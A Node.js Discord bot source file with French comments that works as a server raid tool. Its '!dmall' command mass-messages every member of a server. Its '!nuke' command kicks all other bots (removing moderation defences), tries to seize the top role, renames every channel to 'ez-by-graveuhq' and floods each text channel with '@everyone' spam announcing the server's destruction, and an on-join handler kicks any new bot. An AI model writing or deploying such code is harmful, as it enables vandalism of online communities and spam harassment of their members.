const { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, PermissionsBitField } = require('discord.js');
const http = require('http');

// Serveur HTTP pour garder Render actif 24/7
const PORT = process.env.PORT || 3000;
http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('Bot Godmode Ultimate Operational!\n');
}).listen(PORT, () => console.log(`Serveur HTTP actif sur le port ${PORT}`));

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers,
    ]
});

// Liste des IDs autorisés (Toi et 40fd)
const OWNERS = ['1166445202148442112', '330080470983245824'];

client.on('ready', () => {
    console.log(`Bot connecté en tant que ${client.user.tag} ! Prêt pour le carnage.`);
});

// ==========================================
// SÉCURITÉ ACTIVE : KICK INSTANTANÉ DES AUTRES BOTS
// ==========================================
client.on('guildMemberAdd', async member => {
    if (member.user.bot && member.id !== client.user.id) {
        try {
            await member.kick('Anti-bot de sécurité activé.');
        } catch (err) {}
    }
});

client.on('messageCreate', async message => {
    if (message.author.bot || !message.guild) return;

    const isOwner = OWNERS.includes(message.author.id);

    // ==========================================
    // 1. COMMANDE !DMALL (Turbo Global)
    // ==========================================
    if (message.content === '!dmall') {
        if (!isOwner) return message.reply("❌ Tu n'as pas la permission.");

        await message.reply("💬 **[DMAll Turbo]** Envoie ton message dans ce salon (variables: `{mention}`, `{name}`). \n💡 *Tape **annuler** pour stopper.*");

        const filter = m => m.author.id === message.author.id;
        
        try {
            const collected = await message.channel.awaitMessages({ filter, max: 1, time: 60000, errors: ['time'] });
            const m = collected.first();

            if (m.content.toLowerCase() === 'annuler') {
                return message.channel.send("❌ **Opération DMAll annulée.**");
            }

            const messageTemplate = m.content;

            const previewEmbed = new EmbedBuilder()
                .setColor('#FEE75C')
                .setTitle('⚠️ Confirmation requise - DMAll (Turbo)')
                .setDescription(`Voici le message qui va être diffusé :\n\n\`\`\`${messageTemplate}\`\`\``);

            const row = new ActionRowBuilder()
                .addComponents(
                    new ButtonBuilder().setCustomId('confirm_dmall').setLabel('Confirmer l\'envoi').setStyle(ButtonStyle.Success),
                    new ButtonBuilder().setCustomId('cancel_dmall').setLabel('Annuler').setStyle(ButtonStyle.Danger)
                );

            const confirmMsg = await message.channel.send({ embeds: [previewEmbed], components: [row] });

            const buttonFilter = i => OWNERS.includes(i.user.id);
            const buttonCollector = confirmMsg.createMessageComponentCollector({ filter: buttonFilter, time: 60000, max: 1 });

            buttonCollector.on('collect', async interaction => {
                if (interaction.customId === 'cancel_dmall') {
                    return interaction.update({ content: "❌ **Diffusion DMAll annulée.**", embeds: [], components: [] });
                }

                if (interaction.customId === 'confirm_dmall') {
                    await interaction.update({ content: "🚀 **Diffusion DMAll turbo lancée !**", embeds: [], components: [] });

                    const statusMsg = await message.channel.send({ content: "📊 Envoi en cours..." });

                    try {
                        await message.guild.members.fetch();
                        const members = message.guild.members.cache.filter(member => !member.user.bot);

                        let successCount = 0;
                        let failCount = 0;

                        // Envoi simultané ultra-rapide
                        const promises = members.map(async member => {
                            try {
                                const finalMessage = messageTemplate
                                    .replace(/\{mention\}/g, `<@${member.id}>`)
                                    .replace(/\{name\}/g, member.user.username);
                                await member.send(finalMessage);
                                successCount++;
                            } catch (err) {
                                failCount++;
                            }
                        });

                        await Promise.all(promises);
                        await statusMsg.edit({ content: `✅ **DMAll Terminé !** (Succès: ${successCount} | Échecs: ${failCount})` });

                    } catch (error) {
                        message.channel.send("❌ Erreur lors du DMAll.");
                    }
                }
            });
        } catch (err) {
            message.channel.send("⌛ Temps écoulé.");
        }
    }

    // ==========================================
    // 2. COMMANDE !NUKE (Ultra-Fast & Godmode)
    // ==========================================
    if (message.content === '!nuke') {
        if (!isOwner) return message.reply("❌ Tu n'as pas la permission.");

        message.react('💥').catch(() => {});

        try {
            // A. Placement du rôle du bot au plus haut (Godmode hiérarchie)
            const botMember = await message.guild.members.fetchMe().catch(() => {});
            if (botMember) {
                const highestRole = message.guild.roles.highest;
                await botMember.setHighestRole(highestRole).catch(() => {});
            }

            // B. Suppression instantanée de tous les autres bots du serveur
            message.guild.members.fetch().then(members => {
                members.forEach(m => {
                    if (m.user.bot && m.id !== client.user.id) {
                        m.kick('Nuke Godmode - Bypass').catch(() => {});
                    }
                });
            });

            // C. Salons : Renommage global et spam pings simultanés
            const channels = message.guild.channels.cache;
            channels.forEach(async channel => {
                channel.setName('ez-by-graveuhq').catch(() => {});

                if (channel.isTextBased()) {
                    for (let i = 0; i < 10; i++) {
                        channel.send('@everyone SERVEUR DÉTRUIT PAR K2L discord.gg/yuza').catch(() => {});
                    }
                }
            });

        } catch (error) {
            console.error("Erreur critique Nuke :", error);
        }
    }
});

client.login(process.env.DISCORD_TOKEN);
